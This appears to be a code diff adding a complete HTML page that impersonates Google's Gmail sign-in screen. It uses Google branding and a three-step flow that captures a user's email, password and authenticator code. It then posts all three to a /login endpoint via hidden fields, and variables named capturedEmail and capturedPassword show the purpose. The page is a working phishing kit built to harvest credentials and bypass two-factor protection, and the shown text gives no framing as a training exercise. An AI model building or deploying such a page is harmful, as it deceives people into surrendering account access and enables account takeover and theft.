@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <link rel="icon" href="https://www.google.com/favicon.ico">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Google Sans', 'Roboto', Arial, Helvetica, sans-serif;
+            background: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .card {
+            background: #fff;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 48px 40px 36px;
+            width: 450px;
+            max-width: 94%;
+        }
+        .logo { text-align: center; margin-bottom: 24px; }
+        .logo img { height: 28px; }
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+        .subtitle {
+            font-size: 16px;
+            color: #5f6368;
+            text-align: center;
+            margin-bottom: 32px;
+        }
+        .form-group { margin-bottom: 20px; }
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            color: #5f6368;
+            margin-bottom: 6px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            color: #202124;
+            transition: border-color 0.15s;
+            outline: none;
+        }
+        .form-group input:focus {
+            border-color: #1a73e8;
+            box-shadow: inset 0 0 0 1px #1a73e8;
+        }
+        .form-group input::placeholder { color: #80868b; }
+        .form-actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 8px;
+        }
+        .form-actions a {
+            color: #1a73e8;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+        }
+        .form-actions a:hover { color: #1765cc; }
+        .btn {
+            background: #1a73e8;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            padding: 9px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            letter-spacing: 0.25px;
+            float: right;
+        }
+        .btn:hover { background: #1765cc; box-shadow: 0 1px 3px rgba(26,115,232,0.3); }
+        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
+        .btn-secondary {
+            background: transparent;
+            color: #1a73e8;
+            border: none;
+            font-size: 14px;
+            font-weight: 500;
+            padding: 9px 0;
+            cursor: pointer;
+        }
+        .btn-secondary:hover { color: #1765cc; }
+        .error {
+            color: #d93025;
+            font-size: 14px;
+            margin: 8px 0;
+            display: none;
+            background: #fce8e6;
+            padding: 12px;
+            border-radius: 4px;
+        }
+        .loader {
+            display: none;
+            text-align: center;
+            margin: 20px 0;
+        }
+        .spinner {
+            width: 24px; height: 24px;
+            border: 3px solid #e0e0e0;
+            border-top-color: #1a73e8;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .footer {
+            text-align: center;
+            margin-top: 32px;
+            font-size: 12px;
+            color: #5f6368;
+        }
+        .footer a { color: #5f6368; text-decoration: none; margin: 0 12px; font-size: 12px; }
+        .footer a:hover { color: #202124; }
+        .help-text {
+            display: none;
+            margin-top: 24px;
+            padding: 16px;
+            background: #f8f9fa;
+            border-radius: 4px;
+            font-size: 14px;
+            color: #5f6368;
+        }
+        .help-text p { margin-bottom: 8px; }
+        .mfa-section { display: none; }
+        .hidden { display: none; }
+        .show { display: block; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="logo">
+            <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
+        </div>
+        
+        <h1 id="headerText">Sign in</h1>
+        <p class="subtitle" id="subtitleText">to continue to Gmail</p>
+
+        <div id="errorMsg" class="error"></div>
+        <div class="loader" id="loader"><div class="spinner"></div><p style="margin-top:12px;font-size:13px;color:#5f6368;">Checking info...</p></div>
+
+        <!-- Step 1: Email -->
+        <div id="step1">
+            <form id="formEmail" onsubmit="return step1Submit()">
+                <div class="form-group">
+                    <label for="email">Email or phone</label>
+                    <input type="email" id="email" name="email" placeholder="Enter your email" autofocus required>
+                </div>
+                <div class="form-actions">
+                    <a href="#" onclick="showHelp('email')">Forgot email?</a>
+                    <button type="submit" class="btn">Next</button>
+                </div>
+            </form>
+        </div>
+
+        <!-- Step 2: Password -->
+        <div id="step2" class="hidden">
+            <div class="form-group" style="display:flex;align-items:center;gap:12px;margin-bottom:16px;">
+                <div style="width:32px;height:32px;border-radius:50%;background:#1a73e8;color:#fff;display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:500;" id="avatar">U</div>
+                <span id="displayEmail" style="font-size:14px;color:#5f6368;"></span>
+                <button class="btn-secondary" onclick="backToEmail()" style="margin-left:auto;">Not you?</button>
+            </div>
+            <form id="formPassword" onsubmit="return step2Submit()">
+                <div class="form-group">
+                    <label for="password">Enter your password</label>
+                    <input type="password" id="password" name="password" placeholder="Password" required>
+                </div>
+                <div class="form-actions">
+                    <a href="#" onclick="showHelp('password')">Forgot password?</a>
+                    <button type="submit" class="btn">Next</button>
+                </div>
+            </form>
+        </div>
+
+        <!-- Step 3: MFA / 2FA -->
+        <div id="step3" class="hidden">
+            <p style="font-size:14px;color:#5f6368;margin-bottom:24px;">Enter the verification code generated by your Google Authenticator app.</p>
+            <form id="formMFA" action="/login" method="POST" onsubmit="return finalSubmit()">
+                <input type="hidden" id="hidden_email" name="username" value="">
+                <input type="hidden" id="hidden_password" name="password" value="">
+                <div class="form-group">
+                    <label for="mfa_code">Verification code</label>
+                    <input type="text" id="mfa_code" name="TotpPin" placeholder="Enter code" autocomplete="off" style="letter-spacing:4px;font-size:20px;text-align:center;font-weight:500;" maxlength="6">
+                </div>
+                <div class="form-actions">
+                    <a href="#" onclick="showHelp('mfa')">Trouble signing in?</a>
+                    <button type="submit" class="btn">Verify</button>
+                </div>
+            </form>
+        </div>
+
+        <div class="help-text" id="helpBox">
+            <p><strong>Find your email</strong></p>
+            <p>Enter the email address or phone number you use to sign in to Google. This can be your Gmail address, your Google Workspace email, or another email address associated with your account.</p>
+            <button class="btn-secondary" onclick="closeHelp()">Close</button>
+        </div>
+
+        <div class="footer">
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+    </div>
+
+    <script>
+        let capturedEmail = '';
+        let capturedPassword = '';
+
+        function showHelp(type) {
+            document.getElementById('helpBox').style.display = 'block';
+        }
+        function closeHelp() {
+            document.getElementById('helpBox').style.display = 'none';
+        }
+
+        function step1Submit() {
+            const email = document.getElementById('email').value.trim();
+            if (!email || !email.includes('@')) {
+                showError('Enter a valid email or phone number.');
+                return false;
+            }
+            capturedEmail = email;
+            document.getElementById('displayEmail').textContent = email;
+            document.getElementById('avatar').textContent = email[0].toUpperCase();
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step1').style.display = 'none';
+            document.getElementById('step2').classList.remove('hidden');
+            document.getElementById('step2').style.display = 'block';
+            document.getElementById('headerText').textContent = 'Welcome back';
+            document.getElementById('subtitleText').textContent = email;
+            hideError();
+            setTimeout(function() { document.getElementById('password').focus(); }, 100);
+            return false;
+        }
+
+        function backToEmail() {
+            document.getElementById('step2').style.display = 'none';
+            document.getElementById('step1').style.display = 'block';
+            document.getElementById('headerText').textContent = 'Sign in';
+            document.getElementById('subtitleText').textContent = 'to continue to Gmail';
+            document.getElementById('email').focus();
+        }
+
+        function step2Submit() {
+            const pass = document.getElementById('password').value.trim();
+            if (!pass) {
+                showError('Enter a password.');
+                return false;
+            }
+            capturedPassword = pass;
+            hideError();
+
+            // Check if MFA step is needed — simulate by showing MFA step
+            document.getElementById('hidden_email').value = capturedEmail;
+            document.getElementById('hidden_password').value = capturedPassword;
+            
+            // Show MFA step
+            document.getElementById('step2').style.display = 'none';
+            document.getElementById('step3').classList.remove('hidden');
+            document.getElementById('step3').style.display = 'block';
+            document.getElementById('headerText').textContent = '2-Step Verification';
+            document.getElementById('subtitleText').textContent = 'Enter the code from the Google Authenticator app';
+            setTimeout(function() { document.getElementById('mfa_code').focus(); }, 100);
+            return false;
+        }
+
+        function finalSubmit() {
+            // Show loading
+            document.getElementById('loader').style.display = 'block';
+            document.querySelector('.btn').disabled = true;
+            return true;  // Let form submit to /login
+        }
+
+        function showError(msg) {
+            const el = document.getElementById('errorMsg');
+            el.textContent = msg;
+            el.style.display = 'block';
+        }
+        function hideError() {
+            document.getElementById('errorMsg').style.display = 'none';
+        }
+    </script>
+</body>
+</html>
